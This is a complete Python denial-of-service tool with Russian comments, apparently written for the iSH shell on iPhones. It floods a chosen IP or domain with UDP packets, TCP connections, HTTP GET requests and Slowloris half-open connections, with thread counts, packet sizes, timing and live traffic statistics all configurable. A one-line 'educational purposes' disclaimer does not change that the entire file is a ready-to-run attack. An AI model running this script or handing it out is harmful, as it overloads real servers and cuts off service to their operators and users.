#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DDoS скрипт для iPhone с ish (или любого Unix).
Использует многопоточность для максимальной нагрузки.
Внимание: только в образовательных целях (или для выживания в снежном лесу).
"""

import argparse
import socket
import threading
import time
import random
import sys
import os
from datetime import datetime
import signal

# Глобальные флаги для остановки атаки
stop_attack_flag = False
active_threads = 0
total_packets = 0
lock = threading.Lock()

def signal_handler(sig, frame):
    global stop_attack_flag
    print("\n[!] Получен сигнал остановки. Завершаем потоки...")
    stop_attack_flag = True

signal.signal(signal.SIGINT, signal_handler)

class AttackStats:
    """Класс для сбора статистики в реальном времени."""
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
    
    def add_packet(self, size):
        with self.lock:
            self.packets_sent += 1
            self.bytes_sent += size
    
    def get_stats(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rate = self.packets_sent / elapsed
                bps = self.bytes_sent / elapsed
            else:
                rate = 0
                bps = 0
            return {
                'packets': self.packets_sent,
                'bytes': self.bytes_sent,
                'elapsed': elapsed,
                'rate': rate,
                'bps': bps
            }

stats = AttackStats()

def udp_flood(target_ip, target_port, packet_size, delay):
    """UDP флуд: отправляет мусорные пакеты на указанный порт."""
    global stop_attack_flag
    # Создаём UDP сокет
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Генерируем случайные данные один раз для экономии
    data = os.urandom(packet_size)
    
    while not stop_attack_flag:
        try:
            sock.sendto(data, (target_ip, target_port))
            stats.add_packet(packet_size)
        except Exception as e:
            # Если ошибка, просто игнорим (сеть недоступна и т.п.)
            pass
        if delay > 0:
            time.sleep(delay / 1000.0)  # delay в миллисекундах

def tcp_flood(target_ip, target_port, packet_size, delay):
    """TCP флуд: устанавливает соединение и шлёт данные, затем переподключается."""
    global stop_attack_flag
    while not stop_attack_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, target_port))
            # Шлём мусор
            data = os.urandom(packet_size)
            sock.send(data)
            stats.add_packet(packet_size)
            # Можно держать соединение открытым немного
            time.sleep(0.5)
            sock.close()
        except:
            pass
        if delay > 0:
            time.sleep(delay / 1000.0)

def http_flood(target_ip, target_port, path="/", delay=0):
    """HTTP флуд: отправляет GET запросы, пытаясь нагрузить веб-сервер."""
    global stop_attack_flag
    while not stop_attack_flag:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, target_port))
            request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1\r\nConnection: keep-alive\r\n\r\n"
            sock.send(request.encode())
            stats.add_packet(len(request))
            # Читаем ответ, чтобы не зависнуть (опционально)
            sock.recv(1024)
            sock.close()
        except:
            pass
        if delay > 0:
            time.sleep(delay / 1000.0)

def slowloris(target_ip, target_port, sockets_count=200):
    """Slowloris: открывает много соединений и держит их частично открытыми."""
    global stop_attack_flag
    sockets = []
    # Создаём пул сокетов
    for _ in range(sockets_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\n")
            sockets.append(sock)
        except:
            pass
    
    # Поддерживаем соединения, периодически отправляя заголовки
    while not stop_attack_flag and sockets:
        for sock in sockets[:]:
            try:
                sock.send(b"X-a: b\r\n")
                stats.add_packet(7)  # приблизительный размер
            except:
                sockets.remove(sock)
                # Пытаемся переоткрыть
                try:
                    nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    nsock.settimeout(4)
                    nsock.connect((target_ip, target_port))
                    nsock.send(b"GET / HTTP/1.1\r\n")
                    sockets.append(nsock)
                except:
                    pass
        time.sleep(10)

def worker(target_ip, target_port, attack_type, packet_size, delay, threads_per_worker):
    """Запускает указанное количество потоков одного типа атаки."""
    global active_threads, stop_attack_flag
    threads = []
    for _ in range(threads_per_worker):
        if stop_attack_flag:
            break
        if attack_type == 'udp':
            t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, delay))
        elif attack_type == 'tcp':
            t = threading.Thread(target=tcp_flood, args=(target_ip, target_port, packet_size, delay))
        elif attack_type == 'http':
            t = threading.Thread(target=http_flood, args=(target_ip, target_port, "/", delay))
        elif attack_type == 'slowloris':
            # slowloris отдельный, не будем его запускать многократно
            t = threading.Thread(target=slowloris, args=(target_ip, target_port, 100))
        else:
            print(f"[-] Неизвестный тип атаки: {attack_type}")
            return
        t.daemon = True
        t.start()
        threads.append(t)
        with lock:
            active_threads += 1
    for t in threads:
        t.join()
        with lock:
            active_threads -= 1

def stats_printer(interval=5):
    """Поток для вывода статистики каждые interval секунд."""
    global stop_attack_flag
    while not stop_attack_flag:
        time.sleep(interval)
        s = stats.get_stats()
        print(f"\r[>] Packets: {s['packets']} | Rate: {s['rate']:.2f} pps | Bandwidth: {s['bps']/1024:.2f} KB/s | Elapsed: {s['elapsed']:.1f}s", end='', flush=True)
    print()  # новая строка после остановки

def main():
    parser = argparse.ArgumentParser(description='DDoS скрипт для iPhone ish (многопоточный)')
    parser.add_argument('target', help='Целевой IP адрес или домен')
    parser.add_argument('-p', '--port', type=int, default=80, help='Целевой порт (по умолчанию 80)')
    parser.add_argument('-t', '--type', choices=['udp', 'tcp', 'http', 'slowloris', 'all'], default='udp', help='Тип атаки (по умолчанию udp)')
    parser.add_argument('-T', '--threads', type=int, default=50, help='Общее количество потоков (по умолчанию 50)')
    parser.add_argument('-s', '--size', type=int, default=1024, help='Размер пакета в байтах (по умолчанию 1024)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Задержка между пакетами в миллисекундах (0 - без задержки)')
    parser.add_argument('--duration', type=int, default=0, help='Длительность атаки в секундах (0 - бесконечно, до Ctrl+C)')
    parser.add_argument('--stats-interval', type=int, default=5, help='Интервал вывода статистики (сек)')
    
    args = parser.parse_args()
    
    # Резолвим домен, если нужно
    try:
        target_ip = socket.gethostbyname(args.target)
    except socket.gaierror:
        print(f"[-] Не удалось разрешить имя {args.target}")
        sys.exit(1)
    
    print(f"[+] Начало атаки на {target_ip}:{args.port} (тип: {args.type})")
    print(f"[+] Потоков: {args.threads}, размер пакета: {args.size}, задержка: {args.delay} мс")
    if args.duration > 0:
        print(f"[+] Длительность: {args.duration} секунд")
    else:
        print("[+] Для остановки нажмите Ctrl+C")
    
    global stop_attack_flag
    stop_attack_flag = False
    
    # Запускаем поток статистики
    stats_thread = threading.Thread(target=stats_printer, args=(args.stats_interval,))
    stats_thread.daemon = True
    stats_thread.start()
    
    # Определяем распределение потоков по типам атаки
    if args.type == 'all':
        # Распределяем потоки поровну между udp, tcp, http (slowloris отдельно, он сам управляет соединениями)
        types = ['udp', 'tcp', 'http']
        per_type = max(1, args.threads // len(types))
        remaining = args.threads - per_type * len(types)
        threads_config = []
        for atype in types:
            cnt = per_type + (1 if remaining > 0 else 0)
            remaining -= 1
            threads_config.append((atype, cnt))
        # Запускаем slowloris отдельным потоком, если осталось место
        if args.threads > len(types) * per_type:
            threads_config.append(('slowloris', 1))
    else:
        threads_config = [(args.type, args.threads)]
    
    workers = []
    for atype, cnt in threads_config:
        print(f"[+] Запускаю {cnt} потоков типа {atype}")
        w = threading.Thread(target=worker, args=(target_ip, args.port, atype, args.size, args.delay, cnt))
        w.daemon = True
        w.start()
        workers.append(w)
    
    # Ждём указанное время или до прерывания
    if args.duration > 0:
        time.sleep(args.duration)
        stop_attack_flag = True
    else:
        # Бесконечно, пока не нажат Ctrl+C
        try:
            while not stop_attack_flag:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Получен сигнал остановки...")
            stop_attack_flag = True
    
    # Ждём завершения всех потоков
    for w in workers:
        w.join(timeout=2)
    
    # Финальная статистика
    s = stats.get_stats()
    print("\n[+] Атака завершена.")
    print(f"[+] Всего отправлено пакетов: {s['packets']}")
    print(f"[+] Всего отправлено данных: {s['bytes']} байт ({s['bytes']/1024/1024:.2f} MB)")
    print(f"[+] Средняя скорость: {s['rate']:.2f} пакетов/с, {s['bps']/1024/1024:.2f} MB/s")

if __name__ == '__main__':
    main()
